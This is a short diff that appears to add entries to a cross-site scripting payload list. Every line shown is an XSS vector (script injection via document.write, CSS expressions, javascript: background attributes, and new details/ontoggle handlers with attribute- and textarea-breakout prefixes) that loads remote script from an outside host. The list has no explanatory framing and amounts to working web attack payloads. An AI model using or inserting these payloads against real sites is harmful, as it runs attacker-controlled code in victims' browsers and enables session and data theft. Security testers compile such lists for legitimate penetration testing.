@@ -89,5 +89,8 @@ document.write('<script src=https://b0a.vercel.app/><\/script>')
 <div style="x:expression(import('https://b0a.vercel.app/'))">
 <body background="javascript:import('https://b0a.vercel.app/')">
 <table background="javascript:import('https://b0a.vercel.app/')">
+"><details open ontoggle="this.appendChild(document.createElement('script')).src='https://b0a.vercel.app'"></details>
+><details open ontoggle=import('https://b0a.vercel.app')></details>
+</textarea><details open ontoggle="this.appendChild(document.createElement('script')).src='https://b0a.vercel.app'"></details>
 
 
